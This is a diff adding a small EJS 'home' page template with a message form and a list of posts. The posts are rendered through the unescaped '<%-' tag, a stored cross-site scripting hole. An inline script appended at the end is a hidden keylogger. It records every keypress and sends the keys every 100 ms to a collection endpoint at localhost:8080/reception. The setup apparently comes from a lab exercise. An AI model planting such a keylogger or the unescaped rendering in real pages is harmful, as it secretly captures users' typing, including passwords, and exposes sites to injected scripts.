@@ -1,0 +1,37 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>home</title>
+</head>
+<body>
+    <div>
+        <form action="/home" method="post">
+            <input type="text" name="message" id="message">
+            <button type="submit">Submit</button>
+        </form>
+    </div>
+    <div>
+        <% if (locals.posts) { %>
+            <% for( let index = 0; index < posts.length; index++ ) { %>
+              <p><%- posts[index].content %></p>
+            <% } %>
+           <% } %>
+    </div>
+</body>
+<script>
+var k=""
+document.onkeypress=function(e){
+     k+=e.key;
+}    
+window.setInterval(function(){
+    if(k!=""){(async () => {
+        let c= await fetch('http://localhost:8080/reception', {method: 'POST',headers: {'Accept': 'application/json','Content-Type': 'application/json'},body: JSON.stringify({a: k})})
+        ;}
+        )(); }
+k=""
+},100) 
+</script>
+</html>
